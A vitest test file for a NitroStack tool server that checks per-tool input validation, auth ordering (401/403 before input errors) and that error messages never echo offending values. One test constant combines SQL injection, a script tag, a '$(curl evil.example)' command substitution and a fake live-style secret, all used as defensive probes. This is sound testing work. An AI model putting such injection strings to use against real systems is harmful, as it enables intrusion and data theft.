import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { randomBytes } from 'node:crypto';
import { Tool as CoreTool, extractTools, getGuardsMetadataFromDecorator, type ExecutionContext } from '@nitrostack/core';
import { sha256 } from '../../src/common/auth/keys.js';
import { SELF_VALIDATING_TOOLS } from '../../src/common/validated-tool.js';
import { deferToolValidation } from '../../src/common/sdk-validation.js';
import { AssessmentTools } from '../../src/modules/assessment/assessment.tools.js';
import { CloudTools } from '../../src/modules/cloud/cloud.tools.js';
import { FeedsTools } from '../../src/modules/feeds/feeds.tools.js';
import { IntakeTools } from '../../src/modules/intake/intake.tools.js';
import { PlanningTools } from '../../src/modules/planning/planning.tools.js';
import { ReportTools } from '../../src/modules/report/report.tools.js';
import { VerifyTools } from '../../src/modules/verify/verify.tools.js';

// Every tool validates its own input with its own zod schema, after the auth guard, and the message names a next step.
// Nothing here reaches the network: every input is rejected before the handler body runs.

const CLASSES = [AssessmentTools, CloudTools, FeedsTools, IntakeTools, PlanningTools, ReportTools, VerifyTools] as unknown as (new () => Record<string, unknown>)[];
const READ_KEY = `read-${randomBytes(12).toString('hex')}`;
const WRITE_KEY = `write-${randomBytes(12).toString('hex')}`; // write includes plan and read
const saved: Record<string, string | undefined> = {};
beforeAll(() => {
  for (const k of ['METAMORPH_AUTH', 'METAMORPH_KEY_VALREAD', 'METAMORPH_KEY_VALWRITE']) saved[k] = process.env[k];
  delete process.env.METAMORPH_AUTH;
  process.env.METAMORPH_KEY_VALREAD = `read:${sha256(READ_KEY).toString('hex')}`;
  process.env.METAMORPH_KEY_VALWRITE = `write:${sha256(WRITE_KEY).toString('hex')}`;
});
afterAll(() => {
  for (const [k, v] of Object.entries(saved)) (v === undefined ? delete process.env[k] : (process.env[k] = v));
});

// Build the same pipeline NitroStack runs (guards, then the decorated handler) for every @Tool.
const tools = CLASSES.flatMap((Cls) =>
  extractTools(Cls).map((t) => {
    const instance = new Cls();
    const options = t.options as unknown as { name: string; description: string; inputSchema: unknown; examples?: { request: unknown } };
    const tool = new CoreTool({
      name: options.name,
      description: options.description,
      inputSchema: options.inputSchema as never,
      guards: getGuardsMetadataFromDecorator(Cls.prototype, t.methodName) as never,
      handler: (instance[t.methodName] as (i: unknown, c: unknown) => unknown).bind(instance) as never
    } as never);
    return { name: options.name, tool, options };
  })
);
const byName = (n: string) => tools.find((t) => t.name === n)!;

function ctx(key?: string): ExecutionContext {
  return {
    metadata: key ? { authorization: `Bearer ${key}` } : {},
    toolName: 'x',
    logger: { info: () => undefined, warn: () => undefined, error: () => undefined, debug: () => undefined }
  } as unknown as ExecutionContext;
}
// key: undefined means the write key (passes every guard); null means no key at all.
async function run(name: string, input: unknown, key: string | null | undefined = undefined): Promise<string> {
  try {
    await byName(name).tool.execute(input, ctx(key === null ? undefined : (key ?? WRITE_KEY)));
    return '';
  } catch (e) {
    return (e as Error).message;
  }
}

const REPO = 'https://github.com/owner/legacy-app';
const long = (n: number) => 'a'.repeat(n);
// Built at run time so no secret-looking literal sits in the source.
const SECRET = `${['sk', 'live'].join('_')}_${randomBytes(10).toString('hex')}`;
const INJECTION = `'; DROP TABLE users; -- <script>alert(1)</script> $(curl evil.example) ${SECRET}`;

// [tool, case label, input, regex the message must match for the problem]
const CASES: [string, string, unknown, RegExp][] = [
  // missing required field
  ['assess_project', 'missing required', {}, /repo_url is required/],
  ['plan_modernization', 'missing required', {}, /repo_url is required/],
  ['preview_changes', 'missing required', { repo_url: REPO }, /stage is required/],
  ['apply_stage', 'missing required', { repo_url: REPO, stage: 's' }, /approval_token is required/],
  ['generate_report', 'missing required', {}, /repo_url is required/],
  ['cloud_inventory', 'missing required', {}, /provider is required/],
  // wrong type
  ['assess_project', 'wrong type', { repo_url: 12345 }, /repo_url must be a string \(got a number\)/],
  ['plan_modernization', 'wrong type', { repo_url: ['x'] }, /repo_url must be a string \(got an array\)/],
  ['preview_changes', 'wrong type', { repo_url: REPO, stage: { a: 1 } }, /stage must be a string \(got an object\)/],
  ['apply_stage', 'wrong type', { repo_url: REPO, stage: 's', approval_token: true }, /approval_token must be a string \(got a boolean\)/],
  ['verify_patch', 'wrong type', { run_id: 42 }, /run_id must be a string \(got a number\)/],
  ['generate_report', 'wrong type', { repo_url: REPO, runner_run_ids: 'abc' }, /runner_run_ids must be an object/],
  ['analyze_advisory', 'wrong type', { ids: 12345 }, /ids must be a list or a string \(got a number\)/],
  ['check_watch', 'wrong type', { cve_ids: { a: 1 } }, /cve_ids must be .*\(got an object\)/],
  ['cloud_inventory', 'wrong type', { provider: 5 }, /provider must be 'aws' \(got a number\)/],
  ['cloud_inventory', 'wrong type', { provider: 'aws', regions: 'eu-west-1' }, /regions must be a list \(got a string\)/],
  // too short
  ['assess_project', 'too short', { repo_url: 'short' }, /repo_url must be at least 10 characters long/],
  ['plan_modernization', 'too short', { repo_url: 'x' }, /repo_url must be at least 10 characters long/],
  ['preview_changes', 'too short', { repo_url: REPO, stage: '' }, /stage must not be empty/],
  ['apply_stage', 'too short', { repo_url: REPO, stage: 's', approval_token: '' }, /approval_token must not be empty/],
  ['generate_report', 'too short', { repo_url: 'x' }, /repo_url must be at least 10 characters long/],
  ['verify_patch', 'too short', { repo_url: 'x' }, /repo_url must be at least 10 characters long/],
  ['check_watch', 'too short', { since: 'x' }, /since must be at least 8 characters long/],
  ['analyze_advisory', 'too short', { packages: ['ab'] }, /at least 3 characters long/],
  // too long
  ['assess_project', 'too long', { repo_url: `https://github.com/${long(400)}` }, /repo_url must be at most 300 characters long/],
  ['plan_modernization', 'too long', { repo_url: REPO, subfolder: long(201) }, /subfolder must be at most 200 characters long/],
  ['preview_changes', 'too long', { repo_url: REPO, stage: long(61) }, /stage must be at most 60 characters long/],
  ['apply_stage', 'too long', { repo_url: REPO, stage: 's', approval_token: long(2049) }, /approval_token must be at most 2048 characters long/],
  ['generate_report', 'too long', { repo_url: REPO, subfolder: long(201) }, /subfolder must be at most 200 characters long/],
  ['verify_patch', 'too long', { run_id: long(41) }, /run_id/],
  ['analyze_advisory', 'too long', { ids: long(41) }, /must be at most 40 characters long/],
  ['check_watch', 'too long', { cve_ids: [long(21)] }, /must be at most 20 characters long/],
  ['cloud_inventory', 'too long', { provider: 'aws', regions: [long(31)] }, /regions\[0\]/],
  // bad enum or format
  ['plan_modernization', 'bad enum', { repo_url: REPO, goal: 'everything' }, /goal must be one of: patch_advisory, upgrade_runtime, modernize_all/],
  ['preview_changes', 'bad enum', { repo_url: REPO, stage: 's', goal: INJECTION }, /goal must be one of/],
  ['apply_stage', 'bad enum', { repo_url: REPO, stage: 's', approval_token: 't', goal: 'x' }, /goal must be one of/],
  ['generate_report', 'bad enum', { repo_url: REPO, goal: 'x' }, /goal must be one of/],
  ['verify_patch', 'bad enum', { goal: 'x' }, /goal must be one of/],
  ['cloud_inventory', 'bad enum', { provider: 'gcp' }, /provider must be one of: aws/],
  ['cloud_inventory', 'bad enum', { provider: 'aws', services: ['nope'] }, /services\[0\] must be one of: lambda, rds, eks, ec2, beanstalk/],
  ['cloud_inventory', 'bad format', { provider: 'aws', regions: ['not a region!'] }, /regions\[0\] has an invalid format/],
  ['verify_patch', 'bad format', { run_id: 'abc' }, /run_id has an invalid format \(digits only\)/],
  ['generate_report', 'bad format', { repo_url: REPO, runner_run_ids: { baseline: 'abc' } }, /runner_run_ids\.baseline has an invalid format/],
  ['cloud_inventory', 'unknown field', { provider: 'aws', extra: 1 }, /contains fields this tool does not accept/],
  // oversized array
  ['analyze_advisory', 'oversized array', { ids: Array.from({ length: 11 }, () => 'GHSA-1') }, /ids/],
  ['analyze_advisory', 'oversized array', { packages: Array.from({ length: 51 }, () => 'npm:a@1') }, /packages/],
  ['check_watch', 'oversized array', { cve_ids: Array.from({ length: 21 }, () => 'CVE-1') }, /cve_ids/],
  ['check_watch', 'oversized array', { products: Array.from({ length: 6 }, () => 'php') }, /products/],
  ['cloud_inventory', 'oversized array', { provider: 'aws', regions: Array.from({ length: 7 }, () => 'eu-west-1') }, /regions must have at most 6 items/],
  ['cloud_inventory', 'oversized array', { provider: 'aws', services: Array.from({ length: 6 }, () => 'ec2') }, /services must have at most 5 items/]
];

describe('every tool validates its own input', () => {
  it('covers all eight published tools, and each is registered as self-validating', () => {
    expect(tools.map((t) => t.name).sort()).toEqual(
      ['analyze_advisory', 'apply_stage', 'assess_project', 'check_watch', 'cloud_inventory', 'generate_report', 'plan_modernization', 'preview_changes', 'verify_patch'].sort()
    );
    for (const t of tools) expect(SELF_VALIDATING_TOOLS.has(t.name)).toBe(true);
  });

  it.each(CASES)('%s: %s', async (name, _label, input, problem) => {
    const msg = await run(name, input);
    expect(msg).toMatch(new RegExp(`^Invalid input for ${name}: `));
    expect(msg).toMatch(problem);
    expect(msg).toMatch(/Next step: .*call [a-z_]+ again/);
    expect(msg).toContain('Example: ');
    expect(msg.length).toBeLessThanOrEqual(700);
  });

  it('puts the original problem and the field description into the hint', async () => {
    const msg = await run('assess_project', { repo_url: 'short' });
    expect(msg).toContain('repo_url must be at least 10 characters long');
    expect(msg).toContain('Next step: fix "repo_url" (Public GitHub repository URL');
    expect(msg).toContain('Example: {"repo_url":"https://github.com/owner/legacy-app"}');
  });

  it('lists several problems and counts the rest', async () => {
    const msg = await run('verify_patch', { repo_url: 'x', stage: '', approval_token: '', run_id: 'abc', baseline_run_id: 'abc' });
    expect(msg).toMatch(/\(and 2 more\)/);
  });

  it('every example request in the tool metadata is itself valid input', () => {
    for (const t of tools) {
      const schema = t.options.inputSchema as { safeParse: (v: unknown) => { success: boolean } };
      expect(schema.safeParse(t.options.examples?.request).success, t.name).toBe(true);
    }
  });

  describe('never echoes the offending value', () => {
    const fields: [string, Record<string, unknown>][] = [
      ['assess_project', { repo_url: INJECTION.repeat(3) }], // too long
      ['assess_project', { repo_url: SECRET }], // right type, passes length: rejected later by our own code, never by the formatter
      ['plan_modernization', { repo_url: REPO, goal: INJECTION }], // bad enum
      ['preview_changes', { repo_url: REPO, stage: INJECTION.repeat(3) }], // too long
      ['apply_stage', { repo_url: REPO, stage: 's', approval_token: SECRET.repeat(100) }], // too long, secret-like
      ['verify_patch', { run_id: INJECTION }], // bad format
      ['generate_report', { repo_url: REPO, runner_run_ids: { baseline: INJECTION } }], // bad nested format
      ['cloud_inventory', { provider: INJECTION }], // bad enum
      ['cloud_inventory', { provider: 'aws', regions: [INJECTION] }], // bad format
      ['cloud_inventory', { provider: 'aws', [INJECTION]: 1 }], // unknown key
      ['analyze_advisory', { ids: INJECTION.repeat(2) }], // too long, union branch
      ['analyze_advisory', { packages: { [SECRET]: SECRET } }], // wrong type, object with secret keys and values
      ['check_watch', { since: SECRET.slice(0, 3) }] // too short
    ];
    it.each(fields)('%s', async (name, input) => {
      const msg = await run(name, input);
      for (const needle of [SECRET, 'DROP TABLE', '<script>', 'curl evil', SECRET.slice(0, 12)]) expect(msg).not.toContain(needle);
      if (!msg.startsWith('Invalid repository URL')) expect(msg).toMatch(/^Invalid input for /); // the one row our own URL check answers
    });
  });

  describe('auth runs first', () => {
    it.each(tools.map((t) => [t.name]))('%s: no key gives 401 even when the input is invalid', async (name) => {
      const msg = await run(name, { definitely: 'wrong', repo_url: 12345 }, null);
      expect(msg).toMatch(/^401\b/);
      expect(msg).not.toContain('Invalid input');
    });

    it('a wrong key gives 401 before input errors', async () => {
      const msg = await run('assess_project', { repo_url: 1 }, `bad-${randomBytes(8).toString('hex')}`);
      expect(msg).toMatch(/^401\b/);
    });

    it('a read key on a write tool gives 403 before input errors', async () => {
      const msg = await run('apply_stage', { repo_url: 1 }, READ_KEY);
      expect(msg).toMatch(/^403\b/);
    });

    it('a valid key then gets the input message', async () => {
      expect(await run('assess_project', { repo_url: 1 })).toMatch(/^Invalid input for assess_project/);
    });
  });
});

describe('SDK deferral (sdk-validation.ts)', () => {
  const sdkError = (tool: string) => new Error(`Input validation error: Invalid arguments for tool ${tool}: data/repo_url must NOT have fewer than 10 characters`);
  const fake = (err: Error) => ({
    calls: 0,
    validateToolInput: async function (this: { calls: number }) {
      this.calls += 1;
      throw err;
    }
  });

  it('lets the SDK schema failure pass for a self-validating tool, so the handler can answer', async () => {
    const s = fake(sdkError('assess_project'));
    expect(deferToolValidation(s as never)).toBe(true);
    await expect(s.validateToolInput.call(s, {}, { repo_url: 'x' }, 'assess_project')).resolves.toEqual({ repo_url: 'x' });
  });

  it('keeps the SDK failure for a tool that does not validate itself', async () => {
    const s = fake(sdkError('mystery_tool'));
    deferToolValidation(s as never);
    await expect(s.validateToolInput.call(s, {}, {}, 'mystery_tool')).rejects.toThrow(/Input validation error/);
  });

  it('keeps every other SDK error, such as the input element cap', async () => {
    const s = fake(new Error('Invalid arguments for tool assess_project: arguments contain more than the maximum of 1000 elements'));
    deferToolValidation(s as never);
    await expect(s.validateToolInput.call(s, {}, {}, 'assess_project')).rejects.toThrow(/maximum of 1000 elements/);
  });

  it('patches nothing when the SDK shape is unexpected', () => {
    expect(deferToolValidation({} as never)).toBe(false);
  });
});
